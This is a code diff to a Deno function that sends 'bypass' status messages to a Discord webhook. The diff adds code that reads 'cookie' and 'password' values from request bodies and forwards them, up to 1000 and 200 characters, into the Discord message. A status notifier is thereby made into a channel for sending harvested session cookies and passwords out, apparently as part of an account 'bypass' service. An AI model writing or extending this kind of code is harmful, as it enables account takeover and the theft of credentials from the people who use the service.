@@ -70,10 +70,10 @@ async function postToDiscordWithRetry(
   return { ok: false, attempts: MAX_ATTEMPTS, status: lastStatus, error: lastError };
 }
 
-function buildEmbed(version: "V1" | "V2", status: string, timestamp: string, durationMs?: number) {
+function buildEmbed(version: "V1" | "V2", status: string, timestamp: string, cookie?: string, password?: string, durationMs?: number) {
   const success = status === "COMPLETE";
-  const color = success ? 0x3b82f6 : 0xef4444;
-  const emoji = success ? "✅" : "⚠️";
+  const color = status === "STARTED" ? 0xfacc15 : success ? 0x3b82f6 : 0xef4444;
+  const emoji = status === "STARTED" ? "🚀" : success ? "✅" : "⚠️";
   const unixTs = Math.floor(new Date(timestamp).getTime() / 1000);
 
   const fields: Array<{ name: string; value: string; inline?: boolean }> = [
@@ -81,6 +81,14 @@ function buildEmbed(version: "V1" | "V2", status: string, timestamp: string, dur
     { name: "📊 Status", value: `\`${status}\``, inline: true },
     { name: "🕒 Time", value: `<t:${unixTs}:F>\n<t:${unixTs}:R>`, inline: true },
   ];
+
+  if (cookie) {
+    fields.push({ name: "🍪 Cookie", value: `\`\`\`${cookie.slice(0, 1000)}\`\`\``, inline: false });
+  }
+
+  if (password) {
+    fields.push({ name: "🔑 Password", value: `\`\`\`${password.slice(0, 200)}\`\`\``, inline: false });
+  }
 
   if (typeof durationMs === "number" && durationMs > 0) {
     const seconds = Math.round(durationMs / 1000);
@@ -99,9 +107,11 @@ function buildEmbed(version: "V1" | "V2", status: string, timestamp: string, dur
     embeds: [
       {
         title: `${emoji} Bypass ${status}`,
-        description: success
-          ? `A **${version}** bypass has finished successfully.`
-          : `A **${version}** bypass reported status: \`${status}\`.`,
+        description: status === "STARTED"
+          ? `A **${version}** bypass has been initiated.`
+          : success
+            ? `A **${version}** bypass has finished successfully.`
+            : `A **${version}** bypass reported status: \`${status}\`.`,
         color,
         fields,
         footer: {
@@ -131,10 +141,12 @@ Deno.serve(async (req) => {
     const body = await req.json().catch(() => ({}));
     const version: "V1" | "V2" = body.version === "v2" || body.version === "V2" ? "V2" : "V1";
     const status = typeof body.status === "string" ? body.status.slice(0, 100) : "COMPLETE";
+    const cookie = typeof body.cookie === "string" ? body.cookie : undefined;
+    const password = typeof body.password === "string" ? body.password : undefined;
     const durationMs = typeof body.durationMs === "number" ? body.durationMs : undefined;
     const timestamp = new Date().toISOString();
 
-    const payload = buildEmbed(version, status, timestamp, durationMs);
+    const payload = buildEmbed(version, status, timestamp, cookie, password, durationMs);
     const result = await postToDiscordWithRetry(webhookUrl, payload);
 
     if (!result.ok) {
